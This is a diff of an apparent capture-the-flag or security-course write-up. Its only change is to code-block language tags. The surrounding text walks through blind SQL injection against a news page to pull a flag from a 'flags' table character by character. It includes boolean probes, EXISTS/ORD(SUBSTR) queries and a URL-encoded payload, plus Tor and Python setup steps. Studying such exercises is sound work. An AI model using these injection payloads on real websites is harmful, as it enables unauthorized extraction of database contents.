@@ -30,7 +30,7 @@ According to the second hint, I believe there are vulnerabilities about SQL
 injection in the website. So I tried to append following query strings, assume
 the base url is ``http://tor.atdog.tw/news/1``
 
-.. code-block:: text
+.. code-block:: mysql
 
     '
     `
@@ -42,7 +42,7 @@ the base url is ``http://tor.atdog.tw/news/1``
 Failed. We only got "500 Internal Server Error" page all the time. Try another
 method
 
-.. code-block:: text
+.. code-block:: mysql
 
     AND 1=1
     AND 1=2
@@ -54,7 +54,7 @@ The second hint told me that there is a flag in the "flags" table and its
 column name is called "flag". Chances are there could be multiple rows in that
 table. I want to know how many rows are there in the "flags" table
 
-.. code-block:: text
+.. code-block:: mysql
 
     AND EXISTS(SELECT 1 FROM flags LIMIT 0, 1)
     AND EXISTS(SELECT 1 FROM flags LIMIT 1, 1)
@@ -70,13 +70,13 @@ to narrow down the number of candidates of a single character by asking the
 webpage "larger or smaller" question. After located the exact character, move
 on to the next character. Repeat this action, the flag will show up
 
-.. code-block:: text
+.. code-block:: mysql
 
     AND EXISTS(SELECT 1 FROM flags WHERE ORD(SUBSTR((SELECT flag FROM flags LIMIT 1,1), 1)) <= 79)
 
 Finally, our sophisticated query string which will be appended to the base url is
 
-.. code-block:: text
+.. code-block:: mysql
 
     %20and%20exists(select%201%20from%20flags%20where%20ord(substr((select%20flag%20from%20flags%20limit%201,1),%201))%20%3C=%2079)
 
@@ -90,7 +90,7 @@ Tor must be setup.
 First we need to install Tor via Homebrew ``$ brew install tor``. After the
 installation was done, you will see the caveats shown on the terminal
 
-.. code-block:: text
+.. code-block:: sh
 
     To have launchd start tor at login:
         ln -sfv /usr/local/opt/tor/\*.plist ~/Library/LaunchAgents
@@ -116,7 +116,7 @@ Environment
 I use Python 2.7.8 to write the script, and import some modules for automatic
 login and using SOCKS proxy
 
-.. code-block:: text
+.. code-block:: sh
 
     $ pyenv virtualenv 2.7.8 secprog-2.7.8
     $ pyenv local secprog-2.7.8
